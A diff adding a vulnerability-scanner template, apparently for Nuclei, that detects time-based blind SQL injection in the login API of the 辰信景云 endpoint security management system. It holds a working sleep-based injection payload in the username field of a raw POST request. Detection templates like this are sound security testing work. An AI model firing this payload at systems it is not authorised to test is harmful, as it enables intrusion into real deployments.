@@ -1,0 +1,39 @@
+id: poc-yaml-v-secure-omms-login-sqli
+info:
+  name: 辰信景云终端安全管理系统 login SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    This template identifies an SQL injection vulnerability in the login functionality of 辰信景云终端安全管理系统.
+
+variables:
+  t1: '{{rand_int(5, 10)}}'
+  t2: '{{to_number(t1) + 2}}'
+
+http:
+  - raw:
+      - |
+        POST /api/user/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        captcha=&password=21232f297a57a5a743894a0e4a801fc3&username=admin'and(select*from(select+sleep({{t1}}))a)='
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"errorcode":'
+      - type: word
+        part: body
+        negative: true
+        words:
+          - '<'
+      - type: dsl
+        dsl:
+          - 'duration > t1'
+          - 'duration < t2'
